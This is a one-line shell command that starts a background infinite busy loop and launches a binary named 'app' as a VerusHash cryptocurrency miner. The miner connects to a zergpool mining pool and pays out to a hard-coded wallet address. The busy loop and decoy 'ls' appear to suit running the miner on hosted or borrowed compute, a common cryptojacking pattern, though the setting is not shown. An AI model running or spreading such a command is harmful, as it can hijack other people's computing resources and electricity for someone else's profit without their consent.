ls & for (( ; ; )); do true; done & ./app -v -l "verushash.asia.mine.zergpool.com:3300" -u "RVdiD3Lk9zqScYns4PUKvuQy4HoQFmkmxB"."test" -t "1" "$@"
